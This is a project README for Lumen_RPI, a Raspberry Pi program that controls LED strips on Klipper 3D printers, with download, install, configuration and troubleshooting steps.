---
layout: "default"
title: "💡 Lumen_RPI - Control LEDs Easily for 3D Printing"
description: "💡 Control your Klipper 3D printer's LEDs in real-time with smart effects that enhance your printing experience—no delays or complex macros required."
---
# 💡 Lumen_RPI - Control LEDs Easily for 3D Printing

## 🛠️ Download Now
[![Download Lumen_RPI](https://img.shields.io/badge/Download-Lumen_RPI-brightgreen)](https://github.com/MuhammadAbdullahTariq1363/Lumen_RPI/releases)

## 🚀 Getting Started

Lumen_RPI is designed to help you control LED lights on your Klipper 3D printer in real-time. This application allows you to create smooth animations, show print progress, and manage your printer's state with ease. With support for GPIO and Klipper drivers, you can enhance your 3D printing experience like never before.

## 📦 Requirements

To run Lumen_RPI smoothly, you need:

- A Raspberry Pi (any model should work, but newer ones are recommended for better performance).
- A compatible RGB LED strip (like WS2812B).
- Klipper firmware installed on your printer.
- Moonraker set up for communication with your 3D printer.

Make sure your Raspberry Pi has an internet connection for downloading the necessary files and updates.

## 🔧 Installation Steps

### 1. Visit the Releases Page

To download Lumen_RPI, you need to go to our Releases page:

[Download Lumen_RPI](https://github.com/MuhammadAbdullahTariq1363/Lumen_RPI/releases) 

This page contains the latest versions of the software, including installation files.

### 2. Download the Appropriate File

On the Releases page, you will see several files listed. Look for the file that says "Lumen_RPI_vX.X.tar.gz". The "X.X" will represent the version number. Click on this file to start the download.

### 3. Extract the Files

Once the download is complete, locate the downloaded file on your Raspberry Pi. You will need to extract it. You can do this by opening a terminal and navigating to the folder where the file is located. Run the following command:

```
tar -xzf Lumen_RPI_vX.X.tar.gz
```

This will create a new folder with all the required files.

### 4. Install Dependencies

Before you can run the application, you may need to install some dependencies. Open your terminal and enter the following commands:

```
sudo apt update
sudo apt install python3 python3-pip
pip3 install asyncio gpiozero
```

These commands ensure you have the right packages to run Lumen_RPI.

### 5. Run the Application

Now, navigate into the folder you extracted earlier. Use the command:

```
cd Lumen_RPI
```

From here, you can start the application by typing:

```
python3 main.py
```

Make sure your printer and LED strip are powered on and connected correctly.

## 🌈 Features

Lumen_RPI comes packed with exciting features to enhance your 3D printing experience:

- **Smooth Animations:** Show vibrant animation effects on your LED strip with 60 frames per second.
- **Thermal Gradients:** Visualize temperature changes in real-time, keeping you informed during prints.
- **Print Progress Bars:** Display a visual representation of your print progress directly on your LED strip.
- **State-Driven Effects:** Enjoy different lighting effects based on your printer's current state, like printing, idle, or completing a job.

## 🗂️ File Structure

After extraction, the folder will contain the following files:

```
Lumen_RPI/
│
├── main.py                  # Main application file
├── requirements.txt         # List of dependencies
└── README.md                # This file with usage instructions
```

## ⚙️ Configuration

Once installed, you may want to customize Lumen_RPI to fit your needs. Open the `config.json` file in your favorite text editor. Here, you can adjust settings for animations, color themes, and more.

### Example of Configuration:

```json
{
    "led_count": 100,
    "animation_speed": "fast",
    "color_theme": "cool"
}
```

Adjust the values to match your setup, and save your changes. Restart the application to apply the new settings.

## 🆘 Troubleshooting

If you run into issues while setting up or running Lumen_RPI, here are a few common problems and solutions:

- **Application does not start:** Ensure Python 3 and the required packages are installed correctly. Check your terminal for any error messages.
- **LED strip not responding:** Double-check your wiring and ensure the correct GPIO pins are being used. Refer to the documentation for your specific LED model.
- **Animations are choppy:** This may happen if your Raspberry Pi is under heavy load. Close any unnecessary applications or processes.

## 🌟 Community and Support 

If you need help or want to share your experiences, feel free to join our community. You can find discussions, tips, and tricks on our GitHub Issues page or engage with other users on forums dedicated to 3D printing and Raspberry Pi projects.

## 💬 Feedback

We encourage your feedback to improve Lumen_RPI. If you have suggestions, report bugs, or want to share your setup, please open an issue on the GitHub repository.

## 🔗 Conclusion

Thank you for choosing Lumen_RPI for your LED control needs in 3D printing. We believe this tool will enhance your printing experience and simplify your workflow. Don't forget to check back on the Releases page for updates and new features! 

[Download Lumen_RPI](https://github.com/MuhammadAbdullahTariq1363/Lumen_RPI/releases)